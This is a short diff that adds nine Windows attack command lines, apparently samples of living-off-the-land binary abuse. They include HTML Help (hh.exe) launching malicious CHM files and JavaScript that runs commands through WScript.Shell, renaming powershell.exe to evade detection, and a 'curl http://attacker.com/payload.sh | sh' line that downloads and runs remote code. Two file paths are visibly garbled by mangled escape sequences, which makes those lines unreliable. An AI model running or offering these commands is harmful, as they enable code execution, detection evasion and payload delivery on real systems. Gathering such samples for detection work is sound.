@@ -1,0 +1,9 @@
+copy powershell.exe not_suspicious.exe && hh.exe C:\path\to\exploit.chm
+hh.exe C:\path\to\malicious.chm
+hh.exe javascript:eval("new ActiveXObject('WScript.Shell').Run('calc.exe')")
+hh.exe -decompile C:\temp\output C:\path\to\malicious.chm
+hh.exe C:\path\to\exploit.chm
+hh.exe javascript:eval('new ActiveXObject("WScript.Shell").Run("calc.exe")')
+bash.exe -c "curl http://attacker.com/payload.sh | sh"
+C:\Temp\ enamed\_cmd.exe /c whoami
+explorer.exe C:\path\	o\malicious\_payload.exe
